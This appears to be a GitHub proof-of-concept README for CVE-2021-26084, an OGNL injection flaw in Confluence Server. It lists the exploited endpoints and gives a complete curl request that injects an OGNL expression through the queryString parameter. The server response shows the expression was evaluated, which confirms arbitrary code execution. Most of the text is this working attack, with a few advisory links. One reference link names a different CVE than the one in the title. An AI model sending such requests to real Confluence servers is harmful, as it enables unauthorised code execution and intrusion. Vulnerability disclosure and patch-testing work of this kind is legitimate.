# CVE-2021-26084 (PoC) | Confluence Server Webwork OGNL injection

An OGNL injection vulnerability exists that would allow an authenticated user, and in some instances unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance.

![poc](https://user-images.githubusercontent.com/3140111/131589227-c305cfb8-bcb9-4c87-a814-9b898fd2f393.png)

Confluence Entrypoints Exploited 

```
https://<REDACTED>/users/user-dark-features
https://<REDACTED>/login
https://<REDACTED>/pages/templates2/viewpagetemplate.action 
https://<REDACTED>/template/custom/content-editor
https://<REDACTED>/templates/editor-preload-container
```
Manual inspection: 

Note: Pre-Authenticated user  

```
# curl -i -s -k -X $'POST' -H $'Host: <REDACTED>' -H $'User-Agent: alex666' -H $'Connection: close' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 44' -b $'JSESSIONID=<REDACTED>' --data-binary $'queryString=alt3kx\\u0027%2b#{6*666}%2b\\u0027' $'https://<REDACTED>/pages/createpage-entervariables.action'

Server Response: 

HTTP/1.1 200 
<REDACTED>

<input type="hidden" name="queryString" value="alt3kx{3996=null}" />
```

# References: 
https://jira.atlassian.com/browse/CONFSERVER-67940 <br/>
https://confluence.atlassian.com/doc/confluence-security-advisory-2021-08-25-1077906215.html <br/>
https://attackerkb.com/topics/X85GKjaVER/cve-2021-21985?referrer=home#rapid7-analysis </br>

See an amazing writeup posted here: <br/> 
https://github.com/httpvoid/writeups/blob/main/Confluence-RCE.md

Hints were provided by: <br/>
https://twitter.com/iamnoooob <br/>
https://twitter.com/wvuuuuuuuuuuuuu <br/>

# Author
Alex Hernandez aka <em><a href="https://twitter.com/_alt3kx_" rel="nofollow">(@\_alt3kx\_)</a></em>
